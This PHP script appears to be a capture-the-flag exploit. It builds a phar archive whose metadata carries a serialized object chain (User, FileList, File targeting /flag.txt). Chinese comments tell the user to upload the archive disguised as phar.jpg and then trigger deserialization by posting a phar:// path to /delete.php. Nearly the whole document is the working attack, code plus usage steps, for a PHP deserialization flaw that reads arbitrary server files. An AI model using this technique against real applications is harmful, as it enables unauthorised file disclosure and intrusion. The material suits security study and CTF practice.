<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/6/11
 * Time: 2:44 PM
 */

//1. 用这个构造一个 phar.phar
//2. 重命名为 phar.jpg，传上去
//3. POST 访问 /delete.php ，filename = phar://phar.jpg/exp.txt
//4. flag 到手~

class User {
    public $db;
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

class File {
    public $filename;
}

ini_set('phar.readonly',0);

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "glzjin"); //添加要压缩的文件
//签名自动计算

$phar->stopBuffering();
?>


